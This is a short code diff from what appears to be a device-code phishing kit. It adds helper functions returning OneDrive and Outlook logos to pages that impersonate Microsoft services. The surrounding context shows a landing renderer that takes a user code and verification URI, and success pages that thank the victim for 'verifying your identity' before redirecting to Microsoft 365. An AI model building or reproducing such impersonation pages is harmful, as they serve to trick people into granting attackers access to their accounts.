@@ -957,6 +957,10 @@ def render_landing_onedrive(cfg, user_code, verification_uri, success_url='',
 # SUCCESS renderers
 # ═══════════════════════════════════════════════════════════════════════════
 
+def _onedrive_svg(size=48):
+    """OneDrive cloud logo HTML/SVG."""
+    return assets.get_logo_html('OneDrive', size)
+
 def render_success_onedrive(cfg, success_url):
     title   = cfg.get('success_title','Shared file access review')
     desc    = cfg.get('success_desc','Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.')
@@ -1383,6 +1387,11 @@ h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
 </div>
 <script>setTimeout(()=>window.location.replace("{success_url}"),{delay});</script>
 </body></html>'''
+
+
+def _outlook_svg(size=48):
+    """Outlook logo HTML/SVG."""
+    return assets.get_logo_html('Outlook', size)
 
 
 def render_success_outlook(cfg, success_url):
